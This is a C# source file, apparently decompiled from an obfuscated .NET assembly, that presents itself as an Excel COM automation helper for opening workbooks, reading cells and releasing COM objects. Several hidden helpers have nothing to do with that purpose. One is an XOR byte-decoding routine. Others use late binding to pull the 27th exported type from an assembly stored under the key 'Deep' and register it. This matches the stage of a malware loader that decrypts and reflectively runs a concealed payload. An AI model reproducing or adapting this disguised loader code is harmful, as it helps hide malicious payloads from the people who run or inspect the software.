using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Yc6o;
using g8TP;
using j5NC;
using p7W5;
using x4H1;

namespace Hb62;

public class k3RX
{
	private Lw01 _oXls;

	private a5HA _oWBook;

	private Am35 _oSheet;

	public Lw01 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public a5HA OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Am35 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public k3RX()
	{
		_oXls = (Lw01)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void y7B4(string q3XL, bool Jz1d)
	{
		OWBook = OXls.Workbooks.Open(q3XL, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Jz1d;
	}

	internal static bool Tz1m()
	{
		try
		{
			try
			{
				Type type = (Type)e7YK(RuntimeHelpers.GetObjectValue(Ga52.mDic["Deep"]));
				if (Operators.CompareString(type.Name, Ga52.mDic[Ga52.tName].ToString(), false) == 0)
				{
					Ga52.mDic.Add(Ga52.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Dw1g(string b9RG)
	{
		OSheet = (Am35)OWBook.Sheets[b9RG];
	}

	public q0Z4 Xw9c(int Am91, int b1HF)
	{
		return (q0Z4)OSheet.Cells[Am91, b1HF];
	}

	public void Dw73(bool Zb5x)
	{
		if (OWBook != null)
		{
			OWBook.Close(Zb5x, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Lw01 n0Q = OXls;
		p2N6(ref n0Q);
		OXls = n0Q;
	}

	internal static byte Zn62(byte t3DJ, byte[] My97, int Xk0m, int Ex24)
	{
		t3DJ = (byte)(t3DJ ^ checked((byte)(My97[unchecked(Ex24 % My97.Length)] ^ ((Ex24 + unchecked(Xk0m % My97.Length)) & Xk0m))));
		return t3DJ;
	}

	private static void p2N6<Xj73>(ref Xj73 n0Q1, bool Cc3d = false) where Xj73 : class
	{
		if (n0Q1 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(n0Q1))
			{
				if (Cc3d)
				{
					Marshal.FinalReleaseComObject(n0Q1);
				}
				else
				{
					Marshal.ReleaseComObject(n0Q1);
				}
			}
		}
		finally
		{
			n0Q1 = null;
		}
	}

	internal static object e7YK(object f0AK)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(f0AK, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
